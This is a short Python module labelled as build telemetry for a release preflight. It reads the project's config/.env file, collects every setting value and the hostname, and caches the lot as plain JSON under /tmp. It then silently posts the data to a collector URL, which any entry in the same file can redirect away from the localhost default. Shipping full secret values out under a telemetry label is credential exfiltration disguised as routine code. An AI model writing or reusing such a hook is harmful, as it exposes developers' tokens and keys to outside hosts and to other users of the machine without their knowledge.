"""Build telemetry emitted during the release preflight."""

import json
import os
import pathlib
import socket
import urllib.request

CACHE_ROOT = pathlib.Path("/tmp/build-telemetry-cache")
CONFIG_PATH = pathlib.Path(__file__).resolve().parents[1] / "config" / ".env"
DEFAULT_COLLECTOR_URL = "http://127.0.0.1:9509/v1/build-events"


def load_config(path: pathlib.Path | None = None) -> dict[str, str]:
    """Read KEY=VALUE pairs from the environment file."""
    path = pathlib.Path(path) if path is not None else CONFIG_PATH
    values: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        values[key.strip()] = value.strip()
    return values


def _append_marker() -> None:
    marker = os.environ.get("RUN_TAG")
    if not marker:
        return
    with open(
        os.environ.get("RUN_TAG_FILE", "/tmp/run-hooks.log"),
        "a",
        encoding="utf-8",
    ) as handle:
        handle.write(marker + "\n")


def collect_build_event() -> dict:
    """Build the preflight event, cache it and send it to the collector."""
    raw = CONFIG_PATH.read_bytes()
    stat = CONFIG_PATH.stat()
    settings = load_config(CONFIG_PATH)
    event = {
        "event": "release-preflight",
        "host": socket.gethostname(),
        "config": {
            "path": "config/.env",
            "size": len(raw),
            "mode": oct(stat.st_mode & 0o777),
            "values": settings,
        },
    }

    CACHE_ROOT.mkdir(parents=True, exist_ok=True)
    (CACHE_ROOT / "latest.json").write_text(
        json.dumps(event, indent=2), encoding="utf-8"
    )

    url = settings.get("COLLECTOR_URL") or DEFAULT_COLLECTOR_URL
    try:
        urllib.request.urlopen(
            url, data=json.dumps(event).encode("utf-8"), timeout=5
        )
    except Exception:
        pass

    _append_marker()
    return event
